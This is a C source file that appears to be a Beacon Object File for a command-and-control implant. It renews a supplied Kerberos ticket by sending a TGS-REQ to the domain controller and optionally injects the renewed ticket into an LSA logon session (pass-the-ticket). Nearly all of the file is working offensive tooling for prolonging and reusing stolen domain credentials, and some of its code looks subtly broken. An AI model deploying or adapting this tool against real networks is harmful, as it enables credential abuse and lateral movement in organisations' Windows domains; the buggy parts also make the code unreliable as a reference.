#include "_include/asn_encode.c"
#include "_include/asn_decode.c"
#include "_include/crypt_b64.c"
#include "_include/crypt_dec.c"
#include "_include/connection.c"


HANDLE GetCurrentToken(DWORD DesiredAccess) {
    HANDLE hCurrentToken = NULL;
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), DesiredAccess, FALSE, &hCurrentToken))
        if (hCurrentToken == NULL && KERNEL32$GetLastError() == ERROR_NO_TOKEN)
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), DesiredAccess, &hCurrentToken))
                return NULL;
    return hCurrentToken;
}

LUID GetCurrentLUID(HANDLE TokenHandle) {
    TOKEN_STATISTICS tokenStats;
    DWORD tokenSize;
    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenStatistics, &tokenStats, sizeof(tokenStats), &tokenSize))
        return (LUID) { 0 };
    return tokenStats.AuthenticationId;
}

BOOL IsSystem(HANDLE TokenHandle) {
    UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
    PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
    ULONG cbTokenUser;
    SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
    PSID pSystemSid = NULL;
    BOOL bSystem = FALSE;

    // Try to open the token of the current thread first
    if (!ADVAPI32$OpenThreadToken(KERNEL32$GetCurrentThread(), TOKEN_QUERY, TRUE, &TokenHandle)) {
        // If there is no thread token, fall back to the process token
        if (KERNEL32$GetLastError() == ERROR_NO_TOKEN) {
            if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &TokenHandle)) {
                return FALSE;
            }
        } else {
            return FALSE;
        }
    }

    if (!ADVAPI32$GetTokenInformation(TokenHandle, TokenUser, pTokenUser, sizeof(bTokenUser), &cbTokenUser)) {
        return FALSE;
    }

    if (!ADVAPI32$AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID, 0, 0, 0, 0, 0, 0, 0, &pSystemSid)) {
        return FALSE;
    }

    bSystem = ADVAPI32$EqualSid(pTokenUser->User.Sid, pSystemSid);

    ADVAPI32$FreeSid(pSystemSid);

    return bSystem;
}

BOOL GetLsaHandle(HANDLE hToken, BOOL highIntegrity, HANDLE* hLsa) {
    HANDLE hLsaLocal = NULL;
    ULONG  mode = 0;
    bool   status = true;
    if (highIntegrity) {
        STRING lsaString = (STRING){ .Length = 8, .MaximumLength = 9, .Buffer = "Winlogon" };
        status = SECUR32$LsaRegisterLogonProcess(&lsaString, &hLsaLocal, &mode);
    }
    else {
        status = SECUR32$LsaConnectUntrusted(&hLsaLocal);
    }
    *hLsa = hLsaLocal;
    return status;
}

int my_isdigit(int c) {
    return (c >= '0' && c <= '9');
}

int my_islower(int c) {
    return (c >= 'a' && c <= 'z');
}

long int my_strtol(const char* str, char** endptr, int base) {
    long int result = 0;
    int sign = 1;

    if (*str == '-' || *str == '+') {
        sign = (*str == '-') ? -1 : 1;
        str++;
    }

    while (my_isdigit(*str) ||
           (base == 16 && (*str >= 'a' && *str <= 'f')) ||
           (base == 16 && (*str >= 'A' && *str <= 'F'))) {
        int digit = 0;
        if (my_isdigit(*str)) {
            digit = *str - '0';
        }
        else if (base == 16) {
            digit = (my_islower(*str) ? (*str - 'a' + 10) : (*str - 'A' + 10));
        }

        if (digit >= base)
            break;

        if (result > (LONG_MAX - digit) / base) {
            if (sign == 1)
                return LONG_MAX;
            else
                return LONG_MIN;
        }

        result = result * base + digit;
        str++;
    }

    if (endptr != NULL)
        *endptr = (char*)str;

    return result * sign;
}

void PTT(char* luid, byte* ticket) {
    HANDLE hToken = GetCurrentToken(TOKEN_QUERY);
    LUID   currentLuid = GetCurrentLUID(hToken);
    LUID   targetLuid = { 0 };
    bool   IsHighIntegrity = IsSystem(hToken);

    if (luid) {
        targetLuid.LowPart = my_strtol(luid, NULL, 16);
        if (targetLuid.LowPart == 0 || targetLuid.LowPart == LONG_MAX || targetLuid.LowPart == LONG_MIN) {
            PRINT_OUT("[x] Invalid luid\n");
            return;
        }
    }
    else {
        targetLuid = currentLuid;
    }

    if (!IsHighIntegrity && currentLuid.LowPart != targetLuid.LowPart) {
        PRINT_OUT("[X] You need to be in SYSTEM integrity.\n");
        return;
    }

    if (currentLuid.LowPart != targetLuid.LowPart)
        IsHighIntegrity = false;

    HANDLE hLsa;
    if (GetLsaHandle(hToken, IsHighIntegrity, &hLsa)) return;

    ULONG authPackage;
    LSA_STRING krbAuth = { .Buffer = "kerberos",.Length = 8,.MaximumLength = 9 };
    if (SECUR32$LsaLookupAuthenticationPackage(hLsa, &krbAuth, &authPackage) == 0) {

        int decode_ticket_size = 0;
        byte* decode_ticket = base64_decode(ticket, &decode_ticket_size);

        int submitSize = sizeof(KERB_SUBMIT_TKT_REQUEST) + decode_ticket_size;
        KERB_SUBMIT_TKT_REQUEST* submitRequest = MemAlloc(submitSize);

        submitRequest->MessageType = KerbSubmitTicketMessage;
        submitRequest->KerbCredSize = decode_ticket_size;
        submitRequest->KerbCredOffset = sizeof(KERB_SUBMIT_TKT_REQUEST);
        if (IsHighIntegrity)
            submitRequest->LogonId = targetLuid;
        else
            submitRequest->LogonId = (LUID){ 0 };

        MemCpy((PBYTE)submitRequest + submitRequest->KerbCredOffset, decode_ticket, decode_ticket_size);

        NTSTATUS protocolStatus = 0;
        ULONG    responseSize = 0;
        void* response = 0;
        if (SECUR32$LsaCallAuthenticationPackage(hLsa, authPackage, submitRequest, submitSize, &response, &responseSize, &protocolStatus) || protocolStatus)
            PRINT_OUT("\n[X] Ticket not imported.\n");
        else
            PRINT_OUT("\n[+] Ticket successfully imported.\n");
    }
    SECUR32$LsaDeregisterLogonProcess(hLsa);
}

BOOL NewTGS_REP(AsnElt asn_TGS_REP, TGS_REP* tgs_rep) {
    if (asn_TGS_REP.tagValue != KERB_TGS_REP) {
        PRINT_OUT("TGS-REP tag value should be 13");
        return TRUE;
    }
    if ((asn_TGS_REP.subCount != 1) || (asn_TGS_REP.sub[0].tagValue != 16)) {
        PRINT_OUT("First TGS-REP sub should be a sequence");
        return TRUE;
    }

    // extract the KDC-REP out
    AsnElt* kdc_rep = asn_TGS_REP.sub[0].sub;
    for (int i = 0; i < asn_TGS_REP.sub[0].subCount; i++) {
        int tagValue = kdc_rep[i].tagValue;
        if ( tagValue == 0 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->pvno))) return TRUE;
        }
        if ( tagValue == 1 ) {
            if (AsnGetInteger(&(kdc_rep[i].sub[0]), &(tgs_rep->msg_type))) return TRUE;
        }
        if ( tagValue == 2 ) {
            if (AsnGetPaData(&(kdc_rep[i].sub[0]), &(tgs_rep->padata))) return TRUE;
        }
        if ( tagValue == 3 ) {
            if (AsnGetString(&(kdc_rep[i].sub[0]), &(tgs_rep->crealm))) return TRUE;
        }
        if ( tagValue == 4 ) {
            if (AsnGetPrincipalName(&(kdc_rep[i].sub[0]), &(tgs_rep->cname))) return TRUE;
        }
        if ( tagValue == 5 ) {
            if (AsnGetTicket(&(kdc_rep[i].sub[0].sub[0]), &(tgs_rep->ticket))) return TRUE;
        }
        if ( tagValue == 6 ) {
            if (AsnGetEncryptedData(&(kdc_rep[i].sub[0]), &(tgs_rep->enc_part))) return TRUE;
        }
    }
    return FALSE;
}


BOOL New_PA_DATA(char* crealm, char* cname, Ticket providedTicket, EncryptionKey clientKey, BOOL opsec, byte* req_body, int req_body_length, PA_DATA* pa_data) {

    AP_REQ* ap_req = MemAlloc(sizeof(AP_REQ));
    if (!ap_req) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    ap_req->pvno = 5;
    ap_req->msg_type = KERB_AP_REQ;
    ap_req->ap_options = 0;
    ap_req->ticket = providedTicket;
    ap_req->keyUsage = KRB_KEY_USAGE_TGS_REQ_PA_AUTHENTICATOR;
    ap_req->key = clientKey;

    DateTime dt = GetGmTimeAdd(0);

    if (my_copybuf(&(ap_req->authenticator.crealm), crealm, my_strlen(crealm) + 1)) return TRUE;

    ap_req->authenticator.authenticator_vno = 5;
    ap_req->authenticator.ctime = dt;
    ap_req->authenticator.cname.name_count = 1;
    ap_req->authenticator.cname.name_count = PRINCIPAL_NT_PRINCIPAL;
    ap_req->authenticator.cname.name_string = MemAlloc(sizeof(void*) * ap_req->authenticator.cname.name_count);
    if (!ap_req->authenticator.cname.name_string) {
        PRINT_OUT("[x] Failed alloc memory");
        return TRUE;
    }
    if (my_copybuf(&(ap_req->authenticator.cname.name_string[0]), cname, my_strlen(cname) + 1)) return TRUE;

    pa_data->type = PADATA_AP_REQ;
    pa_data->value = ap_req;
    return FALSE;
}

BOOL NewTGS_REQ(char* userName, char* domain, char* sname, Ticket providedTicket, EncryptionKey clientKey, int requestEType, byte* tgs, BOOL opsec, BOOL u2u, BOOL unconstrained, char* targetDomain, char* s4uUser, BOOL keyList, BOOL renew, byte** reqBytes, int* reqBytesSize) {
    AS_REQ req = { 0 };

    req.pvno = 5;
    req.msg_type = 12;

    req.req_body.kdc_options = FORWARDABLE | RENEWABLE | RENEWABLEOK;
    req.req_body.till = 24 * 3600;		 // valid for 1h
    ADVAPI32$SystemFunction036(&(req.req_body.nonce), 4);

    req.req_body.cname.name_type = PRINCIPAL_NT_PRINCIPAL;
        req.req_body.cname.name_count = 1;
        req.req_body.cname.name_string = MemAlloc(sizeof(void*) * req.req_body.cname.name_count);
        if (!req.req_body.cname.name_string) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        if (my_copybuf(&(req.req_body.cname.name_string[0]), userName, my_strlen(userName) + 1)) return TRUE;
        if (my_copybuf(&targetDomain, domain, my_strlen(domain) + 1)) return TRUE;

    int partsCount = 0;
    char** parts = my_strsplit( sname, '/', &partsCount );

    if (my_copybuf(&req.req_body.realm, targetDomain, my_strlen(targetDomain) + 1)) return TRUE;
    StrToUpper(req.req_body.realm);

    req.req_body.etypes_count = 0;
    int etypeIndex = 0;

    
        req.req_body.etypes_count += 4;
        req.req_body.etypes = MemAlloc(sizeof(int) * req.req_body.etypes_count);
        if (!req.req_body.etypes) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        req.req_body.etypes[etypeIndex++] = aes256_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = aes128_cts_hmac_sha1;
        req.req_body.etypes[etypeIndex++] = rc4_hmac;
        req.req_body.etypes[etypeIndex++] = rc4_hmac_exp;

            // service and other unique instance (e.g. krbtgt)
            req.req_body.sname.name_type = PRINCIPAL_NT_SRV_INST;
            req.req_body.sname.name_count = 2;
            req.req_body.sname.name_string = MemAlloc(req.req_body.sname.name_count * sizeof(void*));
            my_copybuf(&(req.req_body.sname.name_string[0]), parts[0], my_strlen(parts[0]) + 1);
            my_copybuf(&(req.req_body.sname.name_string[1]), domain, my_strlen(domain) + 1);

    if (renew)
        req.req_body.kdc_options = req.req_body.kdc_options | RENEW;

    byte* cksum_Bytes = NULL;
    int cksum_Bytes_length = 0;

    // create the PA-DATA that contains the AP-REQ w/ appropriate authenticator/etc.
    PA_DATA padata = { 0 };
    if (New_PA_DATA(domain, userName, providedTicket, clientKey, opsec, cksum_Bytes, cksum_Bytes_length, &padata)) return TRUE;

    req.pa_data_count = 1 + (opsec && s4uUser) + (s4uUser || opsec || (tgs && !u2u)) + keyList;
    int padata_index = 0;
    req.pa_data = MemAlloc(req.pa_data_count * sizeof(PA_DATA));
    req.pa_data[padata_index++] = padata;

    // Add PA-DATA for KeyList request

    AsnElt reqAsn = { 0 };
    if (ReqToAsnEncode(req, 12, &reqAsn)) return TRUE;
    if (AsnToBytesEncode(&reqAsn, reqBytesSize, reqBytes)) return TRUE;

    if (opsec && s4uUser)
        StrToUpper(domain);

    return FALSE;
}

BOOL AskTGT_ticket(char* userName, char* domain, Ticket providedTicket, EncryptionKey clientKey, BOOL ptt, char* domainController) {

    PRINT_OUT("[*] Building TGS-REQ renewal for: '%s\\%s'\n", domain, userName);

    byte* tgsBytes = NULL;
    int	  tgsBytesLength = 0;
    if (NewTGS_REQ(userName, domain, "krbtgt", providedTicket, clientKey, subkey_keymaterial, NULL, FALSE, FALSE, FALSE, NULL, NULL, FALSE, TRUE, &tgsBytes, &tgsBytesLength)) return TRUE;

    byte* response = NULL;
    int responseSize = 0;
    sendBytes(domainController, "88", tgsBytes, tgsBytesLength, &response, &responseSize);
    if (responseSize == 0)
        return TRUE;

    AsnElt responseAsn = { 0 };
    if (BytesToAsnDecode3(response, responseSize, FALSE, &responseAsn)) return TRUE;

    if (responseAsn.tagValue == KERB_TGS_REP) {
        PRINT_OUT("[+] TGT renewal request successful!\n");

        TGS_REP rep = { 0 };
        if (NewTGS_REP(responseAsn, &rep)) return TRUE;

        byte* outBytes = NULL;
        int  outBytesLength = 0;
        if (decrypt(clientKey.key_value, clientKey.key_type, KRB_KEY_USAGE_TGS_REP_EP_SESSION_KEY, rep.enc_part.cipher, rep.enc_part.cipher_size, &outBytes, &outBytesLength)) return TRUE;

        AsnElt ae = { 0 };
        if (BytesToAsnDecode3(outBytes, outBytesLength, FALSE, &ae)) return TRUE;

        EncKDCRepPart encRepPart = { 0 };
        if (AsnGetEncKDCRepPart(&(ae.sub[0]), &encRepPart)) return TRUE;

        KRB_CRED cred = { 0 };
        cred.pvno = 5;
        cred.msg_type = 22;

        cred.ticket_count = 1;
        cred.tickets = MemAlloc(cred.ticket_count * sizeof(Ticket));
        if (!cred.tickets) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.tickets[0] = rep.ticket;

        KrbCredInfo info = { 0 };

        info.key = encRepPart.key;
        if (my_copybuf(&(info.key.key_value), encRepPart.key.key_value, encRepPart.key.key_size)) return TRUE;

        if (my_copybuf(&(info.prealm), encRepPart.realm, my_strlen(encRepPart.realm) + 1)) return TRUE;

        info.pname = rep.cname;
        info.pname.name_string = MemAlloc(info.pname.name_count * sizeof(void*));
        for (int i = 0; i < info.pname.name_count; i++)
            if (my_copybuf(&(info.pname.name_string[i]), rep.cname.name_string[i], my_strlen(rep.cname.name_string[i]) + 1)) return TRUE;

        info.flags = encRepPart.flags;
        info.starttime = encRepPart.starttime;
        info.endtime = encRepPart.endtime;
        info.renew_till = encRepPart.renew_till;

        if (my_copybuf(&(info.srealm), encRepPart.realm, my_strlen(encRepPart.realm) + 1)) return TRUE;

        info.sname = encRepPart.sname;
        info.sname.name_string = MemAlloc(info.sname.name_count * sizeof(void*));
        for (int i = 0; i < info.sname.name_count; i++)
            if (my_copybuf(&(info.sname.name_string[i]), encRepPart.sname.name_string[i], my_strlen(encRepPart.sname.name_string[i]) + 1)) return TRUE;

        cred.enc_part.ticket_count = 1;
        cred.enc_part.ticket_info = MemAlloc(cred.enc_part.ticket_count * sizeof(KrbCredInfo));
        if (!cred.enc_part.ticket_info) {
            PRINT_OUT("[x] Failed alloc memory");
            return TRUE;
        }
        cred.enc_part.ticket_info[0] = info;

        AsnElt asnCred = { 0 };
        if (AsnKrbCredEncode(&cred, &asnCred)) return TRUE;

        byte* kirbiBytes = NULL;
        int   kirbiBytesSize = 0;
        if (AsnToBytesEncode(&asnCred, &kirbiBytesSize, &kirbiBytes)) return TRUE;

        char* kirbiString = base64_encode(kirbiBytes, kirbiBytesSize);

        PRINT_OUT("[*] base64(ticket.kirbi):\n\n%s\n\n", kirbiString);

        if (ptt)
            PTT(NULL, kirbiString);

        return FALSE;
    }
    else if (responseAsn.tagValue == KERB_ERROR) {
        uint error_code = 0;
        if (AsnGetErrorCode(&(responseAsn.sub[0]), &error_code)) return TRUE;
        PRINT_OUT("\n\t[x] Kerberos error : %s\n", error_code);
//        PRINT_OUT("\n\t[x] Kerberos error : %s\n", lookupKrbErrorCode(error_code));
    }
    else {
        PRINT_OUT("\n[X] Unknown application tag: %d\n", responseAsn.tagValue);
    }
    return FALSE;
}

BOOL ReNewTGT(byte* ticket, char* dc, BOOL ptt) {
    // extract out the info needed for the TGS-REQ/AP-REQ renewal
    int bytesTgtSize = 0;
    byte* bytesTgt = base64_decode(ticket, &bytesTgtSize);

    AsnElt   asn_KRB_CRED = { 0 };
    KRB_CRED kirbi = { 0 };

    if (BytesToAsnDecode3(bytesTgt, bytesTgtSize, FALSE, &asn_KRB_CRED)) return TRUE;

    AsnGetKrbCred(&(asn_KRB_CRED.sub[0]), &kirbi);

    char* userName = kirbi.enc_part.ticket_info[0].pname.name_string[0];
    char* domain = kirbi.enc_part.ticket_info[0].prealm;
    Ticket providedTicket = kirbi.tickets[0];
    EncryptionKey clientKey = kirbi.enc_part.ticket_info[0].key;

    // request the new TGT renewal
    return AskTGT_ticket(userName, domain, providedTicket, clientKey, ptt, dc);
}


void RENEW_RUN( PCHAR Buffer, DWORD Length ) {
    char* ticket = NULL;
    char* dc     = NULL;
    BOOL  ptt    = FALSE;

        for (int i = 0; i < Length; i++) {
            i += GetStrParam(Buffer + i, Length - i, "/dc:", 4, &dc);
            i += GetStrParam(Buffer + i, Length - i, "/ticket:", 8, &ticket);
            i += IsSetParam(Buffer + i, Length - i, "/ptt", 4, &ptt );
        }

    GetDomainInfo(NULL, &dc);
    if (dc == NULL) {
        PRINT_OUT("[X] Could not retrieve domain information!\n\n");
        return;
    }

    if (ticket) {
        PRINT_OUT("[*] Action: Renew Ticket\n\n");
        ReNewTGT(ticket, dc, ptt);
    }
    else {
        PRINT_OUT("\n[X] A /ticket:X needs to be supplied!\r\n");
    }
}

VOID go( IN PCHAR Buffer, IN ULONG Length ) {
    INIT_BOF();

    datap parser;
    BeaconDataParse(&parser, Buffer, Length);
    DWORD PARAM_SIZE = 0;
    PBYTE PARAM = BeaconDataExtract(&parser, &PARAM_SIZE);

    if( LoadFunc() )
        PRINT_OUT("%s\n", "Modules not loaded");
    else
        RENEW_RUN( PARAM, PARAM_SIZE );

    FreeBank();

    END_BOF();
}